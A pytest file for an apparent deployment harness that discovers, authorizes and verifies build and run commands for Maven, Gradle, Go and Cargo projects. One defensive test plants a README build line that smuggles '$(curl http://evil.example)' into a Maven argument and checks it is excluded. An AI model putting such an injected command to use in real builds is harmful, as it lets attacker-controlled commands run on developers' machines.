"""Phase B3 regression tests: JVM, Go and Rust deployment ecosystems.

An ecosystem only counts as supported with the full chain.  These tests
exercise deterministic discovery, unified authorization, artifact freshness
and protocol strong-evidence verification offline: no JVM/Go/Cargo toolchain
or network is required.
"""

import os
import zipfile

import pytest

from auto_harness.command_auth import CommandAuthorizationEngine, CommandRegistry
from auto_harness.modules.analyzer import ProjectAnalyzer
from auto_harness.modules.verify import VerifyModule
from auto_harness.verify.protocols import ProtocolVerifierRegistry


def _run_candidates(analysis, source_kind):
    return [
        item for item in analysis["run_candidates"]
        if item.get("source_kind") == source_kind
    ]


def _registry_candidate(analysis, source_kind, phase):
    registry_data = analysis.get("command_registry") or {}
    if not registry_data:
        return None
    registry = CommandRegistry.from_dict(registry_data)
    return next(
        (
            item for item in registry.candidates
            if item.source_kind == source_kind and item.phase == phase
        ),
        None,
    )


def _authorize(analysis, candidate):
    registry = CommandRegistry.from_dict(analysis["command_registry"])
    return CommandAuthorizationEngine().authorize(
        candidate, registry, repo_dir=None,
    )


def _write_maven_fixture(root, *, wrapper=True, jar=True, readme=""):
    (root / "pom.xml").write_text(
        "<project><groupId>demo</groupId><artifactId>service</artifactId>"
        "<dependencies><dependency>"
        "<groupId>org.springframework.boot</groupId>"
        "<artifactId>spring-boot-starter-web</artifactId>"
        "</dependency></dependencies></project>",
        encoding="utf-8",
    )
    if wrapper:
        (root / "mvnw").write_text("#!/bin/sh\necho maven wrapper\n", encoding="utf-8")
        wrapper_dir = root / ".mvn" / "wrapper"
        wrapper_dir.mkdir(parents=True)
        (wrapper_dir / "maven-wrapper.properties").write_text(
            "distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/3.9.9/apache-maven-3.9.9-bin.zip\n",
            encoding="utf-8",
        )
    if jar:
        (root / "target").mkdir(exist_ok=True)
        with zipfile.ZipFile(root / "target" / "service-1.0.jar", "w") as archive:
            archive.writestr(
                "META-INF/MANIFEST.MF", "Manifest-Version: 1.0\nMain-Class: demo.App\n",
            )
    if readme:
        (root / "README.md").write_text(readme, encoding="utf-8")


def _write_gradle_fixture(root, *, wrapper=True, jar=True):
    (root / "build.gradle").write_text(
        "plugins { id 'org.springframework.boot' version '3.2.0' }\n",
        encoding="utf-8",
    )
    if wrapper:
        (root / "gradlew").write_text("#!/bin/sh\necho gradle wrapper\n", encoding="utf-8")
        wrapper_dir = root / "gradle" / "wrapper"
        wrapper_dir.mkdir(parents=True)
        (wrapper_dir / "gradle-wrapper.properties").write_text(
            "distributionUrl=https://services.gradle.org/distributions/gradle-8.10-bin.zip\n",
            encoding="utf-8",
        )
    if jar:
        libs = root / "build" / "libs"
        libs.mkdir(parents=True, exist_ok=True)
        with zipfile.ZipFile(libs / "service.jar", "w") as archive:
            archive.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n")


def _write_go_fixture(root, *, lock=True, binary=True):
    (root / "go.mod").write_text(
        "module example.com/service\n\ngo 1.22\n", encoding="utf-8",
    )
    if lock:
        (root / "go.sum").write_text(
            "example.com/dep v1.0.0 h1:abc=\n", encoding="utf-8",
        )
    (root / "main.go").write_text(
        "package main\n\nimport \"net/http\"\n\n"
        "func main() { http.ListenAndServe(\":8080\", nil) }\n",
        encoding="utf-8",
    )
    if binary:
        out = root / ".harness" / "bin"
        out.mkdir(parents=True, exist_ok=True)
        (out / "service").write_bytes(b"\x7fELF fake binary")
        os.chmod(out / "service", 0o755)


def _write_cargo_fixture(root, *, lock=True, binary=True):
    (root / "Cargo.toml").write_text(
        '[package]\nname = "demo"\nversion = "0.1.0"\nedition = "2021"\n',
        encoding="utf-8",
    )
    src = root / "src"
    src.mkdir(exist_ok=True)
    (src / "main.rs").write_text("fn main() {}\n", encoding="utf-8")
    if lock:
        (root / "Cargo.lock").write_text(
            "version = 3\n\n[[package]]\nname = \"demo\"\nversion = \"0.1.0\"\n",
            encoding="utf-8",
        )
    if binary:
        target = root / "target" / "release"
        target.mkdir(parents=True, exist_ok=True)
        (target / "demo").write_bytes(b"\x7fELF fake binary")
        os.chmod(target / "demo", 0o755)


def test_maven_wrapper_build_and_artifact_run(tmp_path):
    _write_maven_fixture(tmp_path)

    analysis = ProjectAnalyzer().analyze(tmp_path).data

    build = _registry_candidate(analysis, "jvm_maven_build", "install")
    assert build is not None
    assert build.argv == ["./mvnw", "-DskipTests", "package"]
    assert build.network_profile == "registry_only"
    decision = _authorize(analysis, build)
    assert decision.verdict == "auto_allowed"
    assert decision.reason_code == "pinned_jvm_wrapper_build"

    run = _run_candidates(analysis, "jvm_artifact_run")
    assert run and run[0]["cmd"] == ["java", "-jar", "target/service-1.0.jar"]
    assert run[0]["command_candidate_id"]
    registry_candidate = _registry_candidate(analysis, "jvm_artifact_run", "run")
    run_decision = _authorize(analysis, registry_candidate)
    assert run_decision.verdict == "auto_allowed"
    assert run_decision.reason_code == "hash_pinned_artifact_run"
    assert registry_candidate.network_profile == "none"


def test_maven_without_wrapper_is_not_reproducible(tmp_path):
    _write_maven_fixture(tmp_path, wrapper=False, jar=False)

    analysis = ProjectAnalyzer().analyze(tmp_path).data

    assert not _run_candidates(analysis, "jvm_artifact_run")
    assert _registry_candidate(analysis, "jvm_maven_build", "install") is None
    assert any(
        item["reason_code"] == "maven_wrapper_missing"
        for item in analysis["entrypoint_discovery"]["rejections"]
    )
    assert analysis["deployability"]["status"] == "partial"


def test_gradle_wrapper_bootjar_build(tmp_path):
    _write_gradle_fixture(tmp_path)

    analysis = ProjectAnalyzer().analyze(tmp_path).data

    build = _registry_candidate(analysis, "jvm_gradle_build", "install")
    assert build is not None
    assert build.argv == ["./gradlew", "bootJar", "--no-daemon"]
    assert "Spring Boot plugin declared" in build.score_reasons
    assert _authorize(analysis, build).verdict == "auto_allowed"
    assert _run_candidates(analysis, "jvm_artifact_run")


def test_go_module_build_and_binary_run(tmp_path):
    _write_go_fixture(tmp_path)

    analysis = ProjectAnalyzer().analyze(tmp_path).data

    build = _registry_candidate(analysis, "go_build", "install")
    assert build is not None
    assert build.argv == [
        "go", "build", "-mod=readonly", "-o", ".harness/bin/service", ".",
    ]
    assert build.network_profile == "registry_only"
    assert _authorize(analysis, build).verdict == "auto_allowed"

    run = _run_candidates(analysis, "go_binary_run")
    assert run and run[0]["cmd"] == ["./.harness/bin/service"]
    registry_candidate = _registry_candidate(analysis, "go_binary_run", "run")
    assert _authorize(analysis, registry_candidate).verdict == "auto_allowed"


def test_go_without_go_sum_is_not_reproducible(tmp_path):
    _write_go_fixture(tmp_path, lock=False, binary=False)

    analysis = ProjectAnalyzer().analyze(tmp_path).data

    assert not _run_candidates(analysis, "go_binary_run")
    assert any(
        item["reason_code"] == "go_lockfile_missing"
        for item in analysis["entrypoint_discovery"]["rejections"]
    )


def test_cargo_locked_build_and_binary_run(tmp_path):
    _write_cargo_fixture(tmp_path)

    analysis = ProjectAnalyzer().analyze(tmp_path).data

    build = _registry_candidate(analysis, "cargo_build", "install")
    assert build is not None
    assert build.argv == [
        "cargo", "build", "--locked", "--release", "--bin", "demo",
    ]
    assert _authorize(analysis, build).verdict == "auto_allowed"

    run = _run_candidates(analysis, "cargo_binary_run")
    assert run and run[0]["cmd"] == ["./target/release/demo"]
    registry_candidate = _registry_candidate(analysis, "cargo_binary_run", "run")
    assert _authorize(analysis, registry_candidate).verdict == "auto_allowed"


def test_cargo_without_lock_is_not_reproducible(tmp_path):
    _write_cargo_fixture(tmp_path, lock=False, binary=False)

    analysis = ProjectAnalyzer().analyze(tmp_path).data

    assert not _run_candidates(analysis, "cargo_binary_run")
    assert any(
        item["reason_code"] == "cargo_lockfile_missing"
        for item in analysis["entrypoint_discovery"]["rejections"]
    )


def test_malicious_build_argument_never_enters_candidates(tmp_path):
    _write_maven_fixture(
        tmp_path,
        readme=(
            "Build with:\n\n```\n./mvnw package "
            "-Dmaven.repo.local=$(curl http://evil.example)\n```\n"
        ),
    )

    analysis = ProjectAnalyzer().analyze(tmp_path).data

    build = _registry_candidate(analysis, "jvm_maven_build", "install")
    assert build is not None
    assert build.argv == ["./mvnw", "-DskipTests", "package"]
    assert not any("curl" in arg or "$(" in arg for arg in build.argv)


def test_modified_artifact_rejected_as_stale(tmp_path):
    _write_go_fixture(tmp_path)
    analysis = ProjectAnalyzer().analyze(tmp_path).data
    registry_candidate = _registry_candidate(analysis, "go_binary_run", "run")
    assert registry_candidate is not None

    # The artifact changed after discovery: the pinned hash no longer holds.
    (tmp_path / ".harness" / "bin" / "service").write_bytes(b"tampered")

    decision = CommandAuthorizationEngine().authorize(
        registry_candidate,
        CommandRegistry.from_dict(analysis["command_registry"]),
        repo_dir=tmp_path,
    )
    assert decision.verdict == "candidate_rejected"
    assert decision.reason_code == "evidence_hash_mismatch"


@pytest.mark.parametrize(
    "fixture_builder",
    [_write_maven_fixture, _write_gradle_fixture, _write_go_fixture, _write_cargo_fixture],
)
def test_native_service_reaches_strong_verified_evidence(tmp_path, fixture_builder):
    class Response:
        status = 200

        def __init__(self, body):
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

        def read(self):
            return self.body.encode("utf-8")

    def echo_urlopen(request, timeout=10):
        return Response(request.full_url)

    fixture_builder(tmp_path)
    analysis = ProjectAnalyzer().analyze(tmp_path).data
    assert analysis["verify_hint"]["service_type"] == "http"

    result = VerifyModule(urlopen=echo_urlopen).verify(
        tmp_path,
        analysis,
        {"pid": 123, "expected_port": 8123, "service_ready": True},
    )

    selection = result.data["protocol_verify_selection"]
    assert selection["verifier_id"] == "builtin.http_trace"
    assert selection["shadow_decision"]["strong_evidence"] is True
    assert result.status == "passed"


def test_readiness_only_endpoint_is_not_strong_evidence(tmp_path):
    class Response:
        status = 200

        def __init__(self, body):
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

        def read(self):
            return self.body.encode("utf-8")

    def health_urlopen(request, timeout=10):
        # A health endpoint answers 200 but never echoes the trace id.
        return Response("UP")

    _write_maven_fixture(tmp_path)
    analysis = ProjectAnalyzer().analyze(tmp_path).data
    analysis["verify_hint"] = {
        "service_type": "http",
        "expected_output": "health",
        "request": {"method": "GET", "path": "/actuator/health"},
    }

    result = VerifyModule(urlopen=health_urlopen).verify(
        tmp_path,
        analysis,
        {"pid": 123, "expected_port": 8123, "service_ready": True},
    )

    assert result.status == "uncertain"
    selection = result.data["protocol_verify_selection"]
    assert selection["shadow_decision"]["strong_evidence"] is False


def test_native_ecosystem_capabilities_are_structured(tmp_path):
    _write_go_fixture(tmp_path, lock=False, binary=False)

    analysis = ProjectAnalyzer().analyze(tmp_path).data

    assert analysis["capabilities"]["languages"] == ["go"]
    assert analysis["capabilities"]["build_systems"] == ["go"]
    assert analysis["deployability"]["missing_capabilities"]
